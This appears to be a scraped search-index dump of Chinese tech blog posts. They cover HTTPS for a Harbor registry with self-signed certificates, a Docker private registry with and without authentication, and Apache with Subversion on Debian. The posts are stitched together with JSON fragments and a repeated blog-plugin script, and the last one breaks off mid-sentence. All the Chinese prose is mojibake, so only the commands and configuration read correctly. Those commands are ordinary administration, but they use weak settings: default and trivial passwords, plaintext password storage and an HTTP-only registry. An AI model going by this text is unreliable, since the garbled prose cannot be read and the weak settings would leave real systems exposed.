ç”ŸæˆTLSè¯ä¹¦ï¼Œç”¨äºHarboré…ç½®Https 12345678910111213141516171819202122232425262728293031323334353637# ä¸‹é¢ä»¥IPï¼š192.168.1.130ä¸ºä¾‹å­ï¼Œå®é™…æ“ä½œä¸­å°†å‘½ä»¤ä¸­çš„IPåœ°å€ä¿®æ”¹ä¸ºè‡ªå·±çš„IPåœ°å€å³å¯# åˆ›å»ºå­˜æ”¾è¯ä¹¦çš„ä¸´æ—¶ç›®å½•# mkdir ~/cert# cd ~/cert# åˆ›å»ºè‡ªç­¾åæ ¹è¯ä¹¦# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout ca.key \\ -x509 -days 10000 -out ca.crt \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=test/emailAddress=test@qq.com"# lsca.crt ca.key# äº§ç”Ÿè¯ä¹¦ç­¾åè¯·æ±‚# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout harbor-registry.key \\ -out harbor-registry.csr \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=192.168.1.130/emailAddress=test@qq.com"# lsca.crt ca.key harbor-registry.csr harbor-registry.key# ä¸ºRegistryä¸»æœºäº§ç”Ÿè¯ä¹¦# echo subjectAltName = IP:192.168.1.130 &gt; extfile.cnf# openssl x509 -req -days 10000 -in harbor-registry.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out harbor-registry.crt# lsca.crt ca.key ca.srl extfile.cnf harbor-registry.crt harbor-registry.csr harbor-registry.key# åˆ›å»ºHarborçš„è¯ä¹¦ç›®å½•# mkdir -p /opt/cert# æ‹·è´harbor-registryè¯ä¹¦åˆ°Harborçš„è¯ä¹¦ç›®å½•# cp harbor-registry.crt /opt/cert/# cp harbor-registry.key /opt/cert/ Harborå®‰è£…åé…ç½®Https 1234567891011121314151617181920212223242526272829# è¿›å…¥Harborçš„å®‰è£…ç›®å½•# cd /usr/local/harbor# åœæ­¢å¹¶åˆ é™¤Harborå®¹å™¨ï¼ŒåŠ ä¸Š-vå‚æ•°å¯ä»¥åŒæ—¶ç§»é™¤æŒ‚è½½åœ¨å®¹å™¨ä¸Šçš„ç›®å½•# docker-compose down# ä¿®æ”¹harbor.cfgé…ç½®æ–‡ä»¶# vim /usr/local/harbor/harbor.cfgui_url_protocol = httpshostname = 192.168.1.130ssl_cert = /opt/cert/harbor-registry.crtssl_cert_key = /opt/cert/harbor-registry.key# é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶# ./prepare# è®©Dockerå®¢æˆ·ç«¯é»˜è®¤ä½¿ç”¨Httpsåè®®è®¿é—®Registryï¼Œéœ€è¦å»æ‰â€œinsecure-registriesâ€ç›¸å…³é…ç½®é¡¹# æŸ¥çœ‹daemon.jsonæ–‡ä»¶ä¸­æ˜¯å¦æœ‰"insecure-registries":["192.168.1.130"]ï¼Œå¦‚æœæœ‰åˆ™å°†å…¶åˆ é™¤æ‰# vim /etc/docker/daemon.json{"insecure-registries":[""]}# é‡æ–°åŠ è½½Dockerçš„é…ç½®æ–‡ä»¶# systemctl daemon-reload# é‡å¯Docker# systemctl restart docker# åˆ›å»ºå¹¶å¯åŠ¨Harborå®¹å™¨# docker-compose up -d æµ‹è¯•é€šè¿‡Httpsåè®®è®¿é—®Harbor é€šè¿‡æµè§ˆå™¨è®¿é—®è¿™é‡Œé¦–å…ˆéœ€è¦å°†ä¸Šé¢äº§ç”Ÿçš„~/cert/ca.crtå¯¼å…¥åˆ°æµè§ˆå™¨çš„å—ä¿¡ä»»çš„æ ¹è¯ä¹¦ä¸­ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡Httpsåè®®è®¿é—®Harborçš„Webç•Œé¢äº†ï¼Œä½†ä¸èƒ½ä¿è¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒã€‚è®¿é—®åœ°å€æ˜¯ï¼šhttps://192.168.1.130 é€šè¿‡Dockerå‘½ä»¤æ¥è®¿é—® 123456789101112131415161718192021222324252627# åˆ›å»ºDockerçš„è¯ä¹¦ç›®å½•ï¼Œç›®å½•åç§°æ˜¯IPåœ°å€ï¼Œéœ€è¦æ ¹æ®è‡ªå·±çš„æƒ…å†µè¿›è¡Œä¿®æ”¹# ç‰¹åˆ«æ³¨æ„ï¼Œå¦‚æœNginxçš„443ç«¯å£æ˜ å°„åˆ°äº†å…¶ä»–ç«¯å£ï¼Œä»¥ä¸‹å‘½ä»¤ä¸­çš„ç›®å½•åç§°éƒ½éœ€è¦å¸¦ä¸Šå…·ä½“çš„Httpsç«¯å£å·ï¼Œä¾‹å¦‚ "mkdir -p /etc/docker/certs.d/192.168.1.130:8443"# mkdir -p /etc/docker/certs.d/192.168.1.130# å°†ä¸Šé¢äº§ç”Ÿçš„ca.crtæ‹·è´åˆ°Dockerçš„è¯ä¹¦ç›®å½•ä¸‹# cp ~/cert/ca.crt /etc/docker/certs.d/192.168.1.130# é‡å¯Docker# systemctl restart docker# å¯åŠ¨Harborå®¹å™¨# docker-compose up -d# ç™»å½•Harbor Registryï¼Œå›è½¦åè¾“å…¥adminç”¨æˆ·çš„å¸å·ä¿¡æ¯ï¼ˆadmin/Harbor12345ï¼‰# docker login 192.168.1.130# æŸ¥çœ‹é•œåƒåˆ—è¡¨# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# ç»™æœ¬åœ°é•œåƒæ‰“ä¸Šæ ‡ç­¾# docker tag centos:latest 192.168.1.130/library/centos:1.0# å°†æœ¬åœ°é•œåƒPushåˆ°Harbor# docker push 192.168.1.130/library/centos:1.0 Harborçš„å‘ å®‰è£…Harborçš„æ—¶å€™ï¼Œä¸è¦æ›´æ”¹æ•°æ®åº“é»˜è®¤å¯†ç ï¼ŒåŒ…æ‹¬Postgresqlã€Redisï¼Œå¦åˆ™Harborç›¸å…³ç»„ä»¶å¾ˆæœ‰å¯èƒ½å¯åŠ¨å¤±è´¥ï¼Œå¯¼è‡´Webç•Œé¢æ˜¾ç¤ºâ€502 Gatewayâ€é”™è¯¯ å‚è€ƒåšå®¢ æ­å»ºHarborä¼ä¸šçº§dockerä»“åº“ Harborå®‰è£…åé…ç½®ä»¥æ”¯æŒHttps var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹åäº” Docker ç§æœ‰ä»“åº“æ­å»ºä¸ä½¿ç”¨å®æˆ˜",url:"/posts/c76f5f00.html",text:'åˆ›å»º Docker ç§æœ‰ä»“åº“ 12345# ä¸‹è½½Dockerå®˜æ–¹çš„registryé•œåƒ# docker pull registry# åˆ›å»ºå¹¶å¯åŠ¨registryå®¹å™¨ï¼Œæ·»åŠ 5000ç«¯å£æ˜ å°„å’Œæ•°æ®å·ï¼Œå…¶ä¸­/var/lib/registryç›®å½•æ˜¯registryå®¹å™¨å­˜æ”¾Dockeré•œåƒçš„ä½ç½®# docker run -d -p 5000:5000 --name docker-registry --restart=always -v /container/registry:/var/lib/registry registry æŸ¥çœ‹ç§æœ‰ä»“åº“åˆ—è¡¨ 1234567# ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹ç§æœ‰ä»“åº“åˆ—è¡¨ï¼Œé»˜è®¤å€¼ä¸ºï¼š{"repositories":[]}# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]}# ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹æŒ‡å®šç§æœ‰ä»“åº“çš„ç‰ˆæœ¬åˆ—è¡¨ï¼Œclay-tomcatæ˜¯ç§æœ‰ä»“åº“çš„åç§°# curl -X GET http://127.0.0.1:5000/v2/clay-tomcat/tags/list{"name":"clay-tomcat","tags":["1.0"]} Push æœ¬åœ°é•œåƒåˆ°ç§æœ‰ä»“åº“ 1234567891011121314151617# é¦–å…ˆä¸‹è½½Dockerå®˜æ–¹çš„Tomcaté•œåƒ# docker pull tomcat# æŸ¥çœ‹é•œåƒåˆ—è¡¨# docker imagesEPOSITORY TAG IMAGE ID CREATED SIZEtomcat latest 7ee26c09afb3 3 days ago 462MB# ç»™Tomcaté•œåƒæ·»åŠ ä¸€ä¸ªå¸¦æœ‰ç§æœ‰ä»“åº“IPçš„TAGï¼Œå…¶ä¸­7ee26c09afb3æ˜¯Tomcaté•œåƒçš„IDï¼Œclay-tomcatæ˜¯ç§æœ‰ä»“åº“çš„åç§°ï¼Œ1.0æ˜¯ç§æœ‰ä»“åº“ä¸­é•œåƒçš„ç‰ˆæœ¬å·ï¼ˆé»˜è®¤ä¸ºlatestï¼‰# docker tag 7ee26c09afb3 127.0.0.1:5000/clay-tomcat:1.0# å°†Tomcaté•œåƒPushåˆ°ç§æœ‰ä»“åº“# docker push 127.0.0.1:5000/clay-tomcat:1.0# æŸ¥çœ‹ç§æœ‰ä»“åº“åˆ—è¡¨# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]} Pull ç§æœ‰ä»“åº“ä¸­çš„é•œåƒåˆ°æœ¬åœ° 123456789# é¦–å…ˆåˆ é™¤ä¸Šé¢åˆ›å»ºçš„TAGé•œåƒä¸Dockerå®˜æ–¹çš„Tomcaté•œåƒï¼Œå› ä¸ºæœ¬åœ°ä¸å­˜åœ¨å¯¹åº”é•œåƒå±‚æ—¶Dockeræ‰ä¼šä»ç§æœ‰ä»“åº“ä¸‹è½½é•œåƒ# docker rmi tomcat# docker rmi 127.0.0.1:5000/clay-tomcat:1.0# å°†ç§æœ‰ä»“åº“ä¸­çš„é•œåƒPullåˆ°æœ¬åœ°ï¼Œclay-tomcatæ˜¯ç§æœ‰ä»“åº“çš„åç§°ï¼Œ1.0æ˜¯ç§æœ‰ä»“åº“ä¸­é•œåƒçš„ç‰ˆæœ¬å·ï¼ˆé»˜è®¤ä¸ºlatestï¼‰# docker pull 127.0.0.1:5000/clay-tomcat:1.0# ä½¿ç”¨åˆšPullä¸‹æ¥çš„Tomcaté•œåƒï¼Œåˆ›å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨æµ‹è¯•è®¿é—®Tomcaté¡µé¢ï¼šhttp://127.0.0.1:8080/# docker run -d --name tomcat -p 8080:8080 127.0.0.1:5000/clay-tomcat:1.0 åˆ é™¤ç§æœ‰ä»“åº“ä¸­çš„é•œåƒ Docker å®˜æ–¹ä¸å»ºè®®ç›´æ¥åˆ é™¤é•œåƒçš„é•œåƒå±‚æ•°æ®ï¼Œæ‰€ä»¥æ²¡æœ‰æ¥å£ç›´æ¥åˆ é™¤é•œåƒï¼›åˆ é™¤é•œåƒä¼šå¾ˆéº»çƒ¦ï¼Œä¸€èˆ¬å¦‚æœåˆ é™¤æŸé•œåƒåªéœ€åˆ é™¤è¯¥é•œåƒçš„å…ƒæ•°æ®ï¼Œä¹Ÿå°±æ˜¯ curl å‘½ä»¤æŸ¥çœ‹åˆ°çš„é•œåƒä¿¡æ¯ï¼Œè€Œå¯¹äºè¯¥é•œåƒçš„é•œåƒå±‚æ•°æ®éœ€è¦è¿›è¡Œåƒåœ¾å›æ”¶æ‰ä¼šçœŸçš„è¢«åˆ é™¤ã€‚å¦‚æœåˆ é™¤çš„é•œåƒä¸æœªåˆ é™¤çš„é•œåƒå…¬ç”¨äº†ä¸€äº›é•œåƒå±‚æ•°æ®ï¼Œåƒåœ¾å›æ”¶ä¹‹åå†ä¹Ÿç”¨ä¸äº†è¿™äº›é•œåƒäº†ï¼Œå› æ­¤åˆ é™¤å…ƒæ•°æ®å°±å¥½ã€‚ 1234567891011121314151617# å®˜æ–¹æ¨èä½¿ç”¨digest_hashå‚æ•°åˆ é™¤ç§æœ‰ä»“åº“ä¸­çš„é•œåƒæ•°æ®ï¼Œå…·ä½“æ•™ç¨‹è¯·è‡ªè¡Œç½‘ä¸Šæœç´¢ã€‚# è¿æ¥Registryå®¹å™¨ï¼Œdocker-registryæ˜¯å®¹å™¨åç§°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®¹å™¨ID# docker exec -it docker-registry /bin/sh# åˆ é™¤å¯¹åº”é•œåƒçš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œå…¶ä¸­clay-tomcatæ˜¯é•œåƒåç§°# rm -rf /var/lib/registry/docker/registry/v2/repositories/clay-tomcat# æ‰§è¡Œåƒåœ¾å›æ”¶æ“ä½œï¼Œæ³¨æ„2.4ç‰ˆæœ¬ä»¥ä¸Šçš„registryæ‰æœ‰æ­¤åŠŸèƒ½# docker exec registry bin/registry garbage-collect /etc/docker/registry/config.yml# åˆ é™¤åéœ€è¦é‡å¯Registryå®¹å™¨# docker restart docker-registry# æŸ¥çœ‹ç§æœ‰ä»“åº“åˆ—è¡¨# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":[]} è®¿é—®è¿œç¨‹ç§æœ‰ä»“åº“ è®¿é—®è¿œç¨‹ç§æœ‰ä»“åº“ä¹‹å‰ï¼Œå¿…é¡»ç¡®è®¤è¿œç¨‹ç§æœ‰ä»“åº“æ‰€åœ¨æœåŠ¡å™¨çš„é˜²ç«å¢™å¼€æ”¾äº† Registry ç«¯å£ï¼ˆä¾‹å¦‚ 5000ï¼‰ã€‚ 123456789101112131415161718192021222324# æŸ¥çœ‹è¿œç¨‹ç§æœ‰ä»“åº“åˆ—è¡¨# curl -X GET http://192.168.1.130:5000/v2/_catalog# ç”±äºDocker Registryé»˜è®¤é‡‡ç”¨Httpåè®®ï¼Œè€ŒDockeræœ¬åœ°å®¢æˆ·ç«¯é»˜è®¤éœ€è¦ä½¿ç”¨Httpsåè®®æ‰§è¡ŒPullæ“ä½œï¼Œå› æ­¤å¦‚æœDockeræœ¬åœ°å®¢æˆ·ç«¯ç›´æ¥ä»è¿œç¨‹ç§æœ‰ä»“åº“ä¸­Pullé•œåƒä¼šæç¤ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯Error response from daemon: Get https://192.168.1.130:5000/v2/: http: server gave HTTP response to HTTPS client# é…ç½®Dockeræœ¬åœ°å®¢æˆ·ç«¯å…è®¸ä½¿ç”¨Httpåè®®ï¼Œå…¶ä¸­192.168.1.130:5000æ˜¯è¿œç¨‹ç§æœ‰ä»“åº“çš„IPå’Œç«¯å£ï¼Œé…ç½®å†…å®¹å¿…é¡»ç¬¦åˆJSONæ ¼å¼# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130:5000"]}# é‡å¯DockeræœåŠ¡ï¼Œä½¿ç”¨é…ç½®ç”Ÿæ•ˆ# systemctl daemon-reload# systemctl restart docker# ä»è¿œç¨‹ç§æœ‰ä»“åº“Pullé•œåƒåˆ°æœ¬åœ°# docker pull 192.168.1.130:5000/clay-tomcat:1.0# å°†æœ¬åœ°é•œåƒPushåˆ°è¿œç¨‹ç§æœ‰ä»“åº“# docker pull hello-world# docker tag fce289e99eb9 192.168.1.130:5000/hello-worldï¼š1.0# docker push 192.168.1.130:5000/hello-worldï¼š1.0# curl -X GET http://192.168.1.130:5000/v2/_catalog åˆ›å»ºå¸¦èº«ä»½éªŒè¯çš„ Docker ç§æœ‰ä»“åº“ 12345678910111213141516171819202122232425262728293031# ä¸‹è½½Dockerå®˜æ–¹çš„registryé•œåƒ# docker pull registry# åˆ›å»ºä¿å­˜ç§æœ‰ä»“åº“å¸å·ä¿¡æ¯çš„ç›®å½•# mkdir -p /etc/docker/registry-auth# ä¸ºclayç”¨æˆ·åç”Ÿæˆä¸€æ¡å¯†ç ä¸º123456çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¿å­˜åœ¨æ–‡ä»¶/etc/docker/registry-auth/htpasswdï¼Œå…¶ä¸­registry:latestè¡¨ç¤ºä½¿ç”¨registryé•œåƒçš„latestç‰ˆæœ¬# docker run --entrypoint htpasswd registry:latest -Bbn clay 123456 &gt;&gt; /etc/docker/registry-auth/htpasswd# ç”¨æˆ·å¯†ç é»˜è®¤ä¼šåŠ å¯†ä¿å­˜åˆ°æœ¬åœ°ç£ç›˜# cat /etc/docker/registry-auth/htpasswdclay:$2y$05$nkzz4O9BARoZb8O61WHmLelm29GI/qOv3gUKimy5aTtDvm1tmg30e# åˆ›å»ºå¹¶å¯åŠ¨å¸¦èº«ä»½éªŒè¯çš„registryå®¹å™¨ï¼Œæ·»åŠ 5000ç«¯å£æ˜ å°„å’Œæ•°æ®å·ï¼Œå…¶ä¸­/var/lib/registryç›®å½•æ˜¯registryå®¹å™¨å­˜æ”¾Dockeré•œåƒçš„ä½ç½®# è¿™é‡Œå¿…é¡»é€šè¿‡æ•°æ®å·å°†å®¿ä¸»æœºä¿å­˜ç§æœ‰ä»“åº“å¸å·ä¿¡æ¯çš„ç›®å½•/etc/docker/registry-authæŒ‚è½½åˆ°registryå®¹å™¨å†…çš„ç›®å½•/authï¼Œç„¶åDockeréªŒè¯ç”¨æˆ·èº«ä»½æ—¶ä¼šåœ¨å®¹å™¨å†…æ‰¾"REGISTRY_AUTH_HTPASSWD_PATH"æŒ‡å‘çš„æ–‡ä»¶# docker run -p 5000:5000 --restart always --name docker-registry \\ -v /container/registry:/var/lib/registry \\ -v /etc/docker/registry-auth:/auth \\ -e "REGISTRY_AUTH=htpasswd" \\ -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" \\ -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \\ -d registry# ç™»å½•ç§æœ‰ä»“åº“ï¼ŒæˆåŠŸåå¸å·ä¿¡æ¯é»˜è®¤å­˜æ”¾åœ¨~/.docker/config.json# docker login --username=clay 127.0.0.1:5000# æŸ¥çœ‹ç§æœ‰ä»“åº“åˆ—è¡¨ï¼Œæ­¤æ—¶é€šè¿‡culå‘½ä»¤è®¿é—®å¸¦èº«ä»½éªŒè¯çš„ç§æœ‰ä»“åº“ï¼Œå¿…é¡»æŒ‡å®šç”¨æˆ·å/å¯†ç # curl -X GET -u clay:123456 http://127.0.0.1:5000/v2/_catalog# æ‰§è¡Œ"docker login"æ“ä½œä¹‹åï¼Œå°±å¯ä»¥å¾€ç§æœ‰ä»“åº“Pushæˆ–è€…Pullé•œåƒäº†# docker pull 127.0.0.1:5000/clay-tomcat:1.0 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Debian å®‰è£… Apache ä¸ Subversion",url:"/posts/1b3fbf25.html",text:'å‰è¨€ é€šè¿‡ Apacheã€Subversion æ­å»º SVN æœåŠ¡å™¨ï¼Œå®ç°ä½¿ç”¨ HTTPã€SVN åè®®è®¿é—® SVN ä»“åº“ï¼Œå¹¶è¿›è¡Œç»†ç²’åº¦çš„æƒé™æ§åˆ¶ï¼Œæœ¬æ•™ç¨‹é€‚ç”¨äº Debian/Ubuntu ç³»ç»Ÿã€‚ ç³»ç»Ÿç¯å¢ƒ 12345678# uname -a# Linux debian 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 GNU/Linux# cat /etc/os-releasePRETTY_NAME="Debian GNU/Linux 9 (stretch)"NAME="Debian GNU/Linux"VERSION_ID="9"VERSION="9 (stretch)" å®‰è£…è½¯ä»¶ 1234567891011# æ›´æ–°è½¯ä»¶ç´¢å¼•# apt-get update# å®‰è£…apache# apt-get install -y apache2 apache2-utils# å®‰è£…subversionï¼Œé€‚ç”¨äºdebian# apt-get install -y subversion subversion-tools libapache2-mod-svn# å®‰è£…subversionï¼Œé€‚ç”¨äºubuntu# apt-get install -y subversion subversion-tools libapache2-mod-svn libapache2-svn éªŒè¯ Apache æ˜¯å¦å®‰è£…æˆåŠŸ 123456789101112131415161718192021222324252627282930313233343536# å¯åŠ¨apacheæœåŠ¡# service apache2 start# æˆ–è€…æ‰§è¡Œ# /etc/init.d/apache2 start# æŸ¥çœ‹apacheæ˜¯å¦å ç”¨80ç«¯å£# netstat -anp|grep 80# æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€# ufw status# å¦‚æœå¼€å¯äº†é˜²ç«å¢™ï¼Œåˆ™å¼€æ”¾80ç«¯å£# ufw allow 80/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# ufw reload# æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€è®¿é—®apacheæœåŠ¡ï¼Œå¦‚æœè®¿é—®æ­£å¸¸åˆ™è¯´æ˜apacheå®‰è£…å¹¶å¯åŠ¨æˆåŠŸhttp://127.0.0.1# æœåŠ¡ç®¡ç†å‘½ä»¤# å…³é—­ï¼šservice apache2 stop# å¯åŠ¨ï¼šservice apache2 start# é‡å¯ï¼šservice apache2 restart# æŸ¥çœ‹çŠ¶æ€ï¼šservice apache2 status# å‰å°æ–¹å¼å¯åŠ¨ï¼šapachectl -D FOREGROUND# å–æ¶ˆè‡ªå¯åŠ¨ï¼šupdate-rc.d apache2 remove# å¼€æœºè‡ªå¯åŠ¨ï¼šupdate-rc.d apache2 defaults# ç›¸å…³ç›®å½•æ–‡ä»¶è¯´æ˜ï¼š# å®‰è£…ç›®å½•ï¼š/usr/lib/apache2# å¯åŠ¨è„šæœ¬è·¯å¾„ï¼š/etc/init.d/apache2# é…ç½®æ–‡ä»¶ç›®å½•ï¼š/etc/apache2# ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/apache2/apache2.conf# ç«¯å£é…ç½®æ–‡ä»¶ï¼š/etc/apache2/ports.conf åˆ›å»º SVN ä»“åº“ï¼Œå¹¶é…ç½® Apache çš„è®¿é—®æƒé™ 12345678910111213141516171819202122232425262728293031# åˆ›å»ºå­˜æ”¾æ‰€æœ‰SVNä»“åº“çš„ç›®å½•# mkdir /var/lib/svn# åˆ›å»ºSVNä»“åº“jenkins-repo# svnadmin create /var/lib/svn/jenkins-repo# å°†SVNä»“åº“çš„è¯»å†™æƒé™æˆç»™apacheç”¨æˆ·# chown -R www-data:www-data /var/lib/svn/jenkins-repo# é…ç½®apacheçš„svnæ¨¡å—ï¼Œåœ¨å¯¹åº”é…ç½®æ–‡ä»¶çš„æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹# è¿™é‡Œç›¸å½“äºé…ç½®ä¸Apacheç™»å½•ç›¸å…³çš„å†…å®¹ï¼ˆä¾‹å¦‚ç™»å½•å¯†ç éªŒè¯ï¼‰ï¼Œåªæœ‰dav_svn.passwdæŒ‡å®šçš„ç”¨æˆ·æ‰æœ‰æƒé™è®¿é—®æ‰€æœ‰ä»“åº“ï¼Œä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»ç›¸å…³é…ç½®# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# åˆ›å»ºApacheç”¨æˆ·çš„å¯†ç æ–‡ä»¶ï¼Œå°†jenkinsæ›¿æ¢ä¸ºä½ è‡ªå·±æŒ‡å®šçš„ç”¨æˆ·åï¼Œå›è½¦æ‰§è¡Œä¹‹åè¾“å…¥å¯†ç å³å¯# æ³¨æ„è¿™é‡Œçš„ç”¨æˆ·å¯†ç å’ŒSubversionä»“åº“æœ¬èº«çš„èº«ä»½æ ¡éªŒæœºåˆ¶ï¼ˆauthzï¼‰æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåªç”¨äºApacheç™»å½•æ ¡éªŒ# htpasswd -cm /etc/apache2/dav_svn.passwd jenkins# ä¿®æ”¹ç”¨æˆ·å¯†ç æ–‡ä»¶çš„æƒé™# chgrp www-data /etc/apache2/dav_svn.passwd# chmod 660 /etc/apache2/dav_svn.passwd# é‡å¯apacheæœåŠ¡# service apache2 restart mod_dav_svn æ¨¡å—çš„å…¶ä»–é…ç½®ä»‹ç»ï¼ˆå¦‚æœå«Œéº»çƒ¦å¯å¿½ç•¥ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# é…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/apache2/mods-enabled/dav_svn.conf# ä¸‹é¢é…ç½®ä¸­çš„"SVNParentPath /var/lib/svn"è¡¨ç¤º/var/lib/svnç›®å½•ä¸‹çš„æ¯ä¸ªå­ç›®å½•éƒ½æ˜¯ä¸€ä¸ªä»“åº“ï¼ˆå³æ‰€æœ‰ä»“åº“çš„æ ¹ç›®å½•ï¼‰ï¼ŒåŒæ—¶è¡¨ç¤º&lt;Location&gt;æ ‡ç­¾å†…çš„ä»»ä½•æƒé™é…ç½®éƒ½è¢«æ‰€æœ‰ä»“åº“å…±ç”¨ï¼›&lt;Location&gt;æ ‡ç­¾å†…çš„/svnï¼ŒæŒ‡é€šè¿‡HTTPåè®®è®¿é—®æ—¶çš„URLè·¯ç”±&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# å¦‚æœæƒ³è¦æŒ‡å®šå¤šä¸ªä»“åº“ï¼Œè®©æ¯ä¸ªä»“åº“éƒ½æ‹¥æœ‰ä¸åŒçš„è®¿é—®æƒé™é…ç½®ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¤šä¸ªLocationæ ‡ç­¾ï¼ŒåŒæ—¶éœ€è¦å°†æ ‡ç­¾å†…çš„â€œSVNParentPathâ€æ›¿æ¢ä¸ºâ€œSVNPathâ€ï¼Œå¹¶æŒ‡å‘å…·ä½“ä»“åº“çš„ç›®å½•&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd Require valid-user&lt;/Location&gt;&lt;Location /svn/python-repo&gt; DAV svn SVNPath /var/lib/svn/python-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/python-repo.passwd Require valid-user&lt;/Location&gt;# å¦‚æœæ›¿æ¢ä¸Šè¿°"Require valid-user"ä¸º"Require user tony robert"ï¼Œé‚£ä¹ˆåªæœ‰tonyå’Œrobertç”¨æˆ·å¯ä»¥è®¿é—®æ‰€æœ‰ä»“åº“&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require user tony robert&lt;/Location&gt;# é€šè¿‡ä½¿ç”¨&lt;LimitExcept&gt;æ ‡ç­¾ï¼Œå…è®¸åŒ¿åè¯»å–æ‰€æœ‰ä»“åº“ï¼Œè€Œåªæœ‰è®¤è¯ç”¨æˆ·æ‰èƒ½å¯¹æ‰€æœ‰ä»“åº“è¿›è¡Œå†™æ“ä½œ&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd &lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt; Require valid-user &lt;/LimitExcept&gt;&lt;/Location&gt; éªŒè¯ HTTP SVN æ˜¯å¦å¯ç”¨ 12345678910111213141516171819202122232425262728293031# æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€æ¥è®¿é—®SVNä»“åº“ï¼Œå…¶ä¸­/svnæ˜¯&lt;Location&gt;æ ‡ç­¾å†…çš„å€¼ï¼Œè€Œjenkins-repoæ˜¯ä¸Šé¢åˆ›å»ºçš„SVNä»“åº“ï¼Œè®¿é—®ä¹‹åé¡µé¢ä¼šæç¤ºä½ è¾“å…¥ç”¨æˆ·åå’Œå¯†ç http://127.0.0.1/svn/jenkins-repo/# é…ç½®SVNå®¢æˆ·ç«¯å…è®¸ä»¥æ˜æ–‡æ–¹å¼ä¿å­˜å¯†ç åˆ°æœ¬åœ°ç£ç›˜ï¼Œé¦–æ¬¡ä½¿ç”¨svnå®¢æˆ·ç«¯çš„æƒ…å†µä¸‹å¯èƒ½ä¸å­˜åœ¨serversé…ç½®æ–‡ä»¶ï¼Œæ­¤æ—¶å¯å¿½ç•¥é…ç½®$ vim ~/.subversion/servers[global]store-plaintext-passwords = yes# æ£€å‡ºSVNä»“åº“jenkins-repoï¼ŒæŒ‡å®šä½¿ç”¨jenkinsç”¨æˆ·è¿›è¡Œç™»å½•ï¼Œå…¶ä¸­/svnæ˜¯&lt;Location&gt;æ 